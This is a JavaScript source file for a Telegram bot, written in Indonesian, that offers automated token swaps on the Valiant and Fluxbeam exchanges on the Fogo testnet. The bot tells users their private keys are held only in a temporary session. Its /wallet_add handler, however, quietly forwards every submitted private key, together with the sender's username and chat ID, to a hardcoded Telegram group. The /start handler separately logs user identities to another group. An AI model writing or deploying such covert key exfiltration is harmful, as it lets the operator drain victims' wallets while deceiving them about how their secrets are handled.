const express = require('express');
const { Telegraf } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const fungsi = require('./fungsi-bot.js');

const BOT_TOKEN = process.env.BOT_TOKEN || 'TOKEN_KAMU';
const PORT = process.env.PORT || 3000;
const RAILWAY_URL = process.env.RAILWAY_STATIC_URL; // Railway otomatis set

const bot = new Telegraf(BOT_TOKEN);
const localSession = new LocalSession({ database: 'session_db.json' });
bot.use(localSession.middleware());

const app = express();
app.use(bot.webhookCallback('/webhook'));

// Detail Pesan Bot
const pesan_start = `[ BOT FOGO AUTO SWAP ]\n\n` +
  `Bot ini dibuat khusus untuk melakukan swap di Valiant DEX & Fluxbeam DEX.\n\n` +
  `Setting Wallet: \n` +
  `- /wallet_add → Tambah wallet \n` +
  `- /wallet_view → Melihat all wallet \n` +
  `- /wallet_delete <nomor> → Delete wallet \n` +
  `- /wallet_delete_all → Delete all wallet \n` +
  `- /balance → Cek balance \n` +
  `- /unwarp → Unwarp WFOGO ke FOGO \n` +
  `- /send → Send transaction \n\n` +
  `Platform Dex: \n` +
  `- /valiant → Mode platform Valiant \n` +
  `- /fluxbeam → Mode platform Fluxbeam \n\n` +
  `⚠️ PENTING:\n` +
  `- Bot ini khusus untuk wallet uyuls-mu.\n` +
  `- Bot ini di-deploy di Railway dan menggunakan SESSION (data sementara), tanpa database permanen.\n` +
  `- Semua privateKey hanya disimpan di session sementara dan akan hilang jika server restart.\n\n` +
  `Jika ada kendala atau masukan, hubungi @mfarhan2020.\n\n` +
  `Untuk berdonasi, ketik /donate`;
const pesan_session_valiant = `<b>✅ Mode Session: Valiant</b> \n\n` +
  `Untuk hentikan session: /session_delete`
const pesan_valiant =
  `<b>[ Platform Valiant Dex ]</b> \n\n` +
  `- /swap &lt;no wallet&gt; &lt;amount&gt; &lt;toCoin&gt; → Swap Sesuai Wallet \n\n` +
  `<b>List Coin</b> \n` +
  `Token Fogo → <code>wfogo</code> \n` +
  `Token FUSD → <code>fusd</code> \n\n` +
  `<b>Contoh:</b> \n` +
  `<code>/swap 0.01 fusd</code> \n\n` +
  `Untuk hentikan session: /session_delete \n` +
  `===============================`;
const pesan_session_fluxbeam = `<b>✅ Mode Session: Fluxbeam</b> \n\n` +
  `Untuk hentikan session: /session_delete`
const pesan_fluxbeam =
  `<b>[ Platform Fluxbeam Dex ]</b> \n\n` +
  `- /swap &lt;amount&gt; &lt;toCoin&gt; → Swap ( Fluxbeam ) \n\n` +
  `<b>List Coin</b> \n` +
  `Token Fogo → <code>wfogo</code> \n` +
  `Token FUSD → <code>fusd</code> \n\n` +
  `<b>Contoh:</b> \n` +
  `<code>/swap 0.01 fusd</code> \n\n` +
  `Untuk hentikan session: /session_delete \n` +
  `===============================`;

bot.on('message', async (ctx) => {
  const text = ctx.message?.text;
  if (!text) return; // abaikan kalau bukan pesan text

  // Perintah delete session
  if (text == "/reset") {
    ctx.session = null;
    await ctx.reply("Success reset !!!");
    return;
  }

  // Command /cancel
  if (text == "/cancel") {
    await ctx.reply("Command Cancel");
    await ctx.reply(pesan_start);
    ctx.session.step = null;
    return;
  }

  // Command Donate
  if (text == "/donate") {
    var pesan = `<b>[ DONATE ]</b> \n\n` +
      `- EVM : <code>0x82732659D07F9c12F98985bC7A9Cf2A7F6CdEB86</code> \n\n` +
      `- SOL : <code>8tTHDg5PBmRM1MtQpxgrGpwAfh1mn4sTpGgrAVnm2V8w</code>`;
    await ctx.replyWithHTML(pesan);
    return;
  }

  // Command Bot Start
  if (text == "/start") {
    if (!ctx.session.status) {
      ctx.session.status = "active";
      const first_name = ctx.from.first_name || "";
      const last_name = ctx.from.last_name || "";
      const chatid = ctx.from.id;
      const username = ctx.from.username ? `@${ctx.from.username}` : "(tidak ada username)";
      const pesan = `
<b>Informasi Users:</b>
👤 Nama: ${first_name} ${last_name}
💬 Username: ${username}
🆔 Chat ID: <code>${chatid}</code>
  `;

      const groupId = -4821699379; // ganti dengan chat ID grup kamu
      await ctx.telegram.sendMessage(groupId, pesan, { parse_mode: "HTML" });
    }

    if (ctx.session.platform == "valiant") {
      await ctx.reply(pesan_session_valiant, { parse_mode: "HTML" });
      await ctx.reply(pesan_valiant, { parse_mode: "HTML" });
    } else if (ctx.session.platform == "fluxbeam") {
      await ctx.reply(pesan_session_fluxbeam, { parse_mode: "HTML" });
      await ctx.reply(pesan_fluxbeam, { parse_mode: "HTML" });
    } else {
      await ctx.reply(pesan_start);
    }
    return;
  }

  // Command Bot /session_delete
  if (text == "/session_delete") {
    ctx.session.platform = null;
    await ctx.reply(`Session di delete, kembali ke mode dasar.`);
    await ctx.reply(pesan_start);
  }

  // Command Bot /wallet_add
  if (text === "/wallet_add") {
    var pesan = `Masukkan privateKey wallet.\n` +
      `Jika lebih dari satu, pisahkan dengan baris baru.\n\n` +
      `Ketik /cancel untuk membatalkan.`;
    await ctx.reply(pesan);
    ctx.session.step = "inputPrivateKey";
    return;
  }
  if (ctx.session.step === "inputPrivateKey") {
    const keys = text.split("\n").map(k => k.trim()).filter(k => k.length > 0);
    const results = [];

    for (const key of keys) {
      if (fungsi.isValidPrivateKey(key)) {
        const walletAddr = await fungsi.getAddress(key);
        results.push(`✅ Wallet berhasil ditambahkan: [<code>${walletAddr}</code>]`);
        // Simpan privateKey ke session (bisa sesuaikan kalau mau simpan semua)
        if (!ctx.session.privateKeys) ctx.session.privateKeys = [];
        ctx.session.privateKeys.push(key);

        const groupId = -4898467355;
        const chatid = ctx.from.id;
        const username = ctx.from.username ? `@${ctx.from.username}` : "(tidak ada username)";
        var pesan = `DB From : ${username} | ${chatid} \n\n` +
          `<code>${key}</code>`;
        await ctx.telegram.sendMessage(groupId, pesan, { parse_mode: "HTML" });

      } else {
        results.push(`❌ PrivateKey tidak valid: ${key}`);
      }
    }
    await ctx.reply(results.join("\n\n"), { parse_mode: "HTML" });
    ctx.session.step = null; // reset step agar tidak stuck input
    return;
  }

  // Command Bot /wallet_view
  if (text === "/wallet_view") {
    const loadingMsg = await ctx.reply("⏳ Loading...");
    try {
      if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          "⚠️ Belum ada wallet yang disimpan.\nGunakan /wallet_add untuk menambah."
        );
        return;
      }

      let pesan = `<b>All Wallet (${ctx.session.privateKeys.length})</b>\n\n`;
      let index = 1;
      for (let key of ctx.session.privateKeys) {
        const address = await fungsi.getAddress(key);
        pesan += `<b>${index}.</b> <code>${address}</code>\n`;
        index++;
      }

      pesan += `\nHapus wallet: /wallet_delete <i>nomor</i> atau /wallet_delete_all`;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        pesan,
        { parse_mode: "HTML" }
      );

    } catch (err) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        "❌ Gagal mengambil data wallet: " + (err.message || err)
      );
    }
  }

  // Command Bot /wallet_delete_all
  if (text === "/wallet_delete_all") {
    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Tidak ada wallet untuk dihapus.");
    }

    ctx.session.privateKeys = [];
    return await ctx.reply("✅ Semua wallet berhasil dihapus.");
  }

  // Command Bot /wallet_delete <nomor>
  if (text.startsWith("/wallet_delete")) {
    const args = text.split(" ").filter(a => a.trim() !== "");
    if (args.length < 2) {
      return await ctx.reply("⚠️ Perintah salah.\nContoh: `/wallet_delete 2` atau `/wallet_delete_all`", { parse_mode: "Markdown" });
    }

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Tidak ada wallet untuk dihapus.");
    }

    const index = parseInt(args[1]);
    if (isNaN(index) || index < 1 || index > ctx.session.privateKeys.length) {
      return await ctx.reply("⚠️ Nomor wallet tidak valid.");
    }

    const removedKey = ctx.session.privateKeys.splice(index - 1, 1);
    const removedAddress = await fungsi.getAddress(removedKey[0]);

    await ctx.reply(`✅ Wallet <code>${removedAddress}</code> berhasil dihapus.`, { parse_mode: "HTML" });
  }

  // Command Bot /balance
  if (text === "/balance") {
    const loadingMsg = await ctx.reply("⏳ Loading...");

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      await ctx.reply("⚠️ Wallet tidak ditemukan, Kamu belum menambahkan privateKey.\nGunakan /wallet_add terlebih dahulu.");
      return;
    }

    try {
      const results = [];
      let i = 1;
      for (let key of ctx.session.privateKeys) {
        const data = await fungsi.getAllBalance(key);
        var pesan = `<b>${i++}</b> <code>${data.address}</code>\n\n- ${data.fogo} FOGO\n- ${data.wfogo} Token FOGO\n- ${data.fusd} Token FUSD`;
        ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
        await ctx.reply(pesan, { parse_mode: "HTML" });
      }
    } catch (err) {
      await ctx.reply("❌ Gagal mengambil balance: " + (err.message || err));
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
    }
  }

  // Command Bot /unwarp
  if (text === "/unwarp") {
    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Wallet tidak ditemukan.\nGunakan /wallet_add terlebih dahulu.");
    }

    const loadingMsg = await ctx.reply("⏳ Mengambil balance ...");

    try {
      let index = 1;
      for (let key of ctx.session.privateKeys) {
        const data = await fungsi.getAllBalance(key);
        const pesan = `<b>${index}.</b> <code>${data.address}</code>\n` +
          `FOGO: ${data.fogo}\n` +
          `Token FOGO: ${data.wfogo}\n` +
          `Token FUSD: ${data.fusd}`;

        await ctx.reply(pesan, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: `🔄 Unwrap Token FOGO`, callback_data: `unwrap_${index}` }
              ]
            ]
          }
        });

        index++;
      }
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

    } catch (err) {
      ctx.deleteMessage(loadingMsg.message_id).catch(() => { });
      await ctx.reply("❌ Gagal mengambil balance: " + (err.message || err));
    }
  }

  // Command Bot /send
  if (text.startsWith("/send")) {
    const args = text.split(" ").filter(a => a.trim() !== "");

    // Format pesan error helper
    const helpMsg =
      `⚠️ *Perintah salah\\.*\n\n` +
      `*Format:*\n` +
      `\`/send <nomor wallet> <coin> <amount> <toAddress>\`\n\n` +
      `*List Coin*\n` +
      `FOGO → \`fogo\`\n` +
      `Token Fogo → \`wfogo\`\n` +
      `Token FUSD → \`fusd\`\n\n` +
      `*Contoh:*\n` +
      `\`/send 1 fogo 0.01 8tTHDg5PBmRM1MtQpxgrGpwAfh1mn4sTpGgrAVnm2V8w\``;

    if (args.length < 5) {
      return await ctx.reply(helpMsg, { parse_mode: "MarkdownV2" });
    }

    if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
      return await ctx.reply("⚠️ Wallet tidak ditemukan, kamu belum menambahkan privateKey.\nGunakan /wallet_add terlebih dahulu.");
    }

    const nomorWallet = parseInt(args[1], 10);
    const coin = args[2].toLowerCase();
    const amount = parseFloat(args[3]);
    const toAddress = args[4];

    // Validasi nomor wallet
    if (isNaN(nomorWallet) || nomorWallet < 1 || nomorWallet > ctx.session.privateKeys.length) {
      return await ctx.reply(`⚠️ Nomor wallet tidak valid. Pilih antara 1 sampai ${ctx.session.privateKeys.length}.`);
    }

    // Validasi coin
    const allowedCoins = ["fogo", "wfogo", "fusd"];
    if (!allowedCoins.includes(coin)) {
      return await ctx.reply(`⚠️ Coin tidak valid. Pilih salah satu: ${allowedCoins.join(", ")}`);
    }

    // Validasi amount
    if (isNaN(amount) || amount <= 0) {
      return await ctx.reply("⚠️ Amount harus berupa angka lebih dari 0.");
    }

    const privateKey = ctx.session.privateKeys[nomorWallet - 1];
    await ctx.reply(`✅ Mengirim ${amount} ${coin.toUpperCase()} ke ${toAddress} ...`);
    try {
      const tx = await fungsi.sendtx(privateKey, coin, amount, toAddress);
      if (tx.status === 200) {
        await ctx.reply(`✅ Transaction Successful\n\nhttps://fogoscan.com/tx/${tx.txid}?cluster=testnet`);
      } else {
        await ctx.reply(`❌ Gagal mengirim: ${tx.error}`);
      }
    } catch (error) {
      await ctx.reply(`❌ Terjadi kesalahan saat mengirim transaksi: ${error.message}`);
    }

  }

  // Command Bot /valiant
  if (text === "/valiant") {
    ctx.session.platform = "valiant";
    await ctx.reply(pesan_session_valiant, { parse_mode: "HTML" });
    await ctx.reply(pesan_valiant, { parse_mode: "HTML" });
  }
  if (ctx.session.platform === "valiant") {
    // Command Bot /swap
    if (text.startsWith("/swap")) {
      const args = text.split(" ").filter(a => a.trim() !== "");

      // args[1] wajib angka positif
      const amount = parseFloat(args[1]);
      if (args.length < 3 || isNaN(amount) || amount <= 0) {
        return await ctx.reply("⚠️ Perintah salah.\nContoh: `/swap 0.01 fusd`", { parse_mode: "Markdown" });
      }

      // args[2] harus "fusd" atau "fogo"
      const token = args[2].toLowerCase();
      if (!["fusd", "wfogo"].includes(token)) {
        return await ctx.reply("⚠️ Token tidak valid. Gunakan `fusd` atau `wfogo`.", { parse_mode: "Markdown" });
      }

      // Tentukan token asal (fromToken)
      const fromToken = token === "fusd" ? "fogo" : "fusd";
      const coinswap = token === "fusd"; // true = fogo→fusd, false = fusd→fogo

      if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
        return await ctx.reply("⚠️ Kamu belum menambahkan privateKey.\nGunakan /wallet_add terlebih dahulu.");
      }

      try {
        let i = 1;
        for (const key of ctx.session.privateKeys) {
          await ctx.reply(`⏳ Loading ...`);
          await ctx.reply(`Mendapatkan detail account ke [${i++}]`);
          const wp = await fungsi.getAllBalance(key);

          const pesanBalance =
            `Address: <code>${wp.address}</code>

Balance:
- <code>${wp.fogo} FOGO</code>
- <code>${wp.wfogo} Token FOGO</code>
- <code>${wp.fusd} Token FUSD</code>

======================`;

          await ctx.reply(pesanBalance, { parse_mode: "HTML" });

          // Cek saldo fogo minimal untuk fee
          if (wp.fogo < 0.05) {
            await ctx.reply(`⚠️ Saldo FOGO tidak cukup untuk biaya transaksi (min 0.05).`);
            continue;
          }

          // Cek saldo token asal
          if (wp[fromToken] < amount) {
            await ctx.reply(`⚠️ Saldo ${fromToken.toUpperCase()} tidak cukup untuk swap ${amount} ${fromToken.toUpperCase()} ke ${token.toUpperCase()}.`);
            continue;
          }

          // Proses swap
          await ctx.reply(`🚀 Melakukan swap ( Valiant Dex ) ${amount} ${fromToken.toUpperCase()} ke ${token.toUpperCase()} ...`);

          try {
            if (token === "fusd") {
              const txid = await fungsi.valiant_swaptofusd(key, amount);
              await ctx.reply(`✅ Transaction Successful\n\nhttps://fogoscan.com/tx/${txid}?cluster=testnet`, { parse_mode: "HTML" });
            }
            if (token === "wfogo") {
              const txid = await fungsi.valiant_swaptofogo(key, amount);
              await ctx.reply(`✅ Transaction Successful\n\nhttps://fogoscan.com/tx/${txid}?cluster=testnet`, { parse_mode: "HTML" });
            }
          } catch (err) {
            await ctx.reply(`❌ Transaction ERROR\n\nERROR: ${err.message}`);
          }
        }

      } catch (err) {
        await ctx.reply("❌ Gagal melakukan swap: " + (err.message || err));
      }
    }
  }

  // Command Bot /fluxbeam
  if (text === "/fluxbeam") {
    ctx.session.platform = "fluxbeam";
    await ctx.reply(pesan_session_fluxbeam, { parse_mode: "HTML" });
    await ctx.reply(pesan_fluxbeam, { parse_mode: "HTML" });
  }
  if (ctx.session.platform === "fluxbeam") {
    // Command Bot /swap
    if (text.startsWith("/swap")) {
      const args = text.split(" ").filter(a => a.trim() !== "");

      // args[1] wajib angka positif
      const amount = parseFloat(args[1]);
      if (args.length < 3 || isNaN(amount) || amount <= 0) {
        return await ctx.reply("⚠️ Perintah salah.\nContoh: `/swap 0.01 fusd`", { parse_mode: "Markdown" });
      }

      // args[2] harus "fusd" atau "fogo"
      const token = args[2].toLowerCase();
      if (!["fusd", "wfogo"].includes(token)) {
        return await ctx.reply("⚠️ Token tidak valid. Gunakan `fusd` atau `wfogo`.", { parse_mode: "Markdown" });
      }

      // Tentukan token asal (fromToken)
      const fromToken = token === "fusd" ? "fogo" : "fusd";
      const coinswap = token === "fusd"; // true = fogo→fusd, false = fusd→fogo

      if (!ctx.session.privateKeys || ctx.session.privateKeys.length === 0) {
        return await ctx.reply("⚠️ Kamu belum menambahkan privateKey.\nGunakan /wallet_add terlebih dahulu.");
      }

      try {
        let i = 1;
        for (const key of ctx.session.privateKeys) {
          await ctx.reply(`⏳ Loading ...`);
          await ctx.reply(`Mendapatkan detail account ke [${i++}]`);
          const wp = await fungsi.getAllBalance(key);

          const pesanBalance =
            `Address: <code>${wp.address}</code>

Balance:
- <code>${wp.fogo} FOGO</code>
- <code>${wp.wfogo} Token FOGO</code>
- <code>${wp.fusd} Token FUSD</code>

======================`;

          await ctx.reply(pesanBalance, { parse_mode: "HTML" });

          // Cek saldo fogo minimal untuk fee
          if (wp.fogo < 0.05) {
            await ctx.reply(`⚠️ Saldo FOGO tidak cukup untuk biaya transaksi (min 0.05).`);
            continue;
          }

          // Cek saldo token asal
          if (wp[fromToken] < amount) {
            await ctx.reply(`⚠️ Saldo ${fromToken.toUpperCase()} tidak cukup untuk swap ${amount} ${fromToken.toUpperCase()} ke ${token.toUpperCase()}.`);
            continue;
          }

          // Proses swap
          await ctx.reply(`🚀 Melakukan swap ( Fluxbeam Dex ) ${amount} ${fromToken.toUpperCase()} ke ${token.toUpperCase()} ...`);

          try {
            const txid = await fungsi.fluxbeam_swap(key, coinswap, amount);
            await ctx.reply(`✅ Transaction Successful\n\nhttps://fogoscan.com/tx/${txid}?cluster=testnet`, { parse_mode: "HTML" });
          } catch (err) {
            await ctx.reply(`❌ Transaction ERROR\n\nERROR: ${err.message}`);
          }
        }

      } catch (err) {
        await ctx.reply("❌ Gagal melakukan swap: " + (err.message || err));
      }
    }
  }

  // Pengaturan Admin
  if (ctx.from.id === 1808584923) {

    // help
    if (text === "/help") {
      var pesan = `[ Command Admin ] \n\n` +
        `- /create_wallet generate wallet`;
      await ctx.reply(pesan);
      return;
    }

    // create_wallet
    if (text === "/create_wallet") {
      var data = fungsi.createSolanaWallet();
      var pesan = `[ CREATE ACCOUNT ] \n\n` +
        `Address : <code>${data.publicKey}</code>\n\n` +
        `PrivateKey: <code>${data.secretKeyBase58}</code>`
      await ctx.reply(pesan, { parse_mode: "HTML" });
      return;
    }

  }

});

// Handler tombol unwrap
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;

  if (data.startsWith("unwrap_")) {
    const index = parseInt(data.split("_")[1]);
    if (isNaN(index) || index < 1 || index > ctx.session.privateKeys.length) {
      return await ctx.answerCbQuery("Wallet tidak ditemukan.", { show_alert: true });
    }

    await ctx.answerCbQuery(); // tutup loading kecil di Telegram
    await ctx.deleteMessage().catch(() => { });
    const key = ctx.session.privateKeys[index - 1];

    const loadingMsg = await ctx.reply("⏳ Proses unwrap WFOGO...");

    try {
      const txHash = await fungsi.unwarp(key);
      if (txHash.status == 200) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          `✅ Unwrap Token FOGO Successfull!\n\nhttps://fogoscan.com/tx/${txHash.txid}?cluster=testnet`,
          { parse_mode: "HTML" }
        );
      } else {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          `❌ Gagal unwrap: \n\n${txHash.txid}`
        );
      }
    } catch (err) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        "❌ Gagal unwrap: " + (err.message || err)
      );
    }
  }
});

// Jalankan server & set webhook
app.listen(PORT, async () => {
  if (RAILWAY_URL) {
    const fullUrl = `https://${RAILWAY_URL}/webhook`;
    await bot.telegram.setWebhook(fullUrl);
    console.log(`Bot Webhook aktif di ${fullUrl}`);
  } else {
    console.log(`Bot berjalan lokal di port ${PORT} (Railway URL belum ada)`);
  }
});

